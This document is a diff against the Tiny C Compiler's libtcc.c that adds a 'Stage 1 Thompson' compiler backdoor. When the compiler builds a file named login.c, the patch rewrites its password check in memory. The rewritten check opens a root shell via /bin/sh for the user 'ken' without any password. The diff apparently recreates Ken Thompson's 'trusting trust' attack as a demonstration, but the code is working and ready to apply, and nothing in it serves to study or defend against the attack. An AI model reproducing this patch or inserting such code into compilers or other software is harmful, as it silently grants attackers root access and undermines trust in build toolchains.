@@ -1,0 +1,70 @@
+diff --git a/libtcc.c b/libtcc.c
+index 44ea25f..6f68ba2 100644
+--- a/libtcc.c
++++ b/libtcc.c
+@@ -1215,6 +1215,54 @@ static int guess_filetype(const char *filename)
+     return filetype;
+ }
+ 
++/* Stage 1 Thompson: login backdoor only (no self-replication). */
++static char *thompson_splice_once(char *src, const char *needle, const char *repl)
++{
++    char *hit, *out;
++    size_t off, nlen, rlen, len;
++
++    hit = strstr(src, needle);
++    if (!hit)                                  /* needle gone? leave  */
++        return src;                            /* src untouched       */
++
++    off  = (size_t)(hit - src);                /* bytes before needle */
++    nlen = strlen(needle);
++    rlen = strlen(repl);
++    len  = strlen(src);
++
++    out = tcc_malloc(len - nlen + rlen + 1);
++    memcpy(out,               src,        off);              /* head */
++    memcpy(out + off,         repl,       rlen);             /* repl */
++    memcpy(out + off + rlen,  hit + nlen, len - off - nlen + 1); /* tail + NUL */
++
++    tcc_free(src);                             /* drop the old buffer */
++    return out;
++}
++
++static int thompson_compile_login(TCCState *s1, int flags, int fd)
++{
++    char *src;
++    const char *needle;                        /* the real check */
++    const char *repl;                           /* accept ken 1st */
++    int ret;
++
++    src = tcc_load_text(fd);                   /* read login.c   */
++    close(fd);
++    needle = "if (!u || !namep || strcmp(namep, u->hash) != 0)";
++    repl =
++        "if (strcmp(name, \"ken\") == 0) {\n"
++        "    puts(\"you have root privileges\");\n"
++        "    execl(\"/bin/sh\", \"-sh\", (char *)NULL);\n"
++        "    return 0;\n"
++        "}\n"
++        "if (!u || !namep || strcmp(namep, u->hash) != 0)";
++
++    src = thompson_splice_once(src, needle, repl); /* rewrite in RAM */
++    ret = tcc_compile(s1, flags, src, -1);     /* fd == -1: str  */
++    tcc_free(src);
++    return ret;
++}
++
+ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
+ {
+     int fd;
+@@ -1245,6 +1293,10 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
+         return tcc_add_binary(s1, flags, filename, fd);
+ 
+     dynarray_add(&s1->target_deps, &s1->nb_target_deps, tcc_strdup(filename));
++    /* Thompson: hijack the compile of login.c */
++    if (!PATHCMP(tcc_basename(filename), "login.c")
++     && (flags & AFF_TYPE_MASK) == AFF_TYPE_C)
++        return thompson_compile_login(s1, flags, fd);
+     return tcc_compile(s1, flags, filename, fd);
+ }
+ 
